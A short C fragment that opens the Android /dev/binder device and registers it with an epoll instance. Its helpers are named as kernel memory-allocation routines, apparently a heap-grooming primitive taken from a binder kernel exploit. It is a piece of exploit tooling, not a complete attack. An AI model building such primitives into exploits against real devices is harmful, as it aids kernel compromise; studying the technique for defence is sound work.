#include <netinet/in.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>

int binder_fd;
int epfd;
struct epoll_event event = { .events = EPOLLIN };
void kmalloc_init()
{
	binder_fd = open("/dev/binder", O_RDONLY);
	epfd = epoll_create(1000);
}

void kmalloc_alloc()
{
	epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);
}


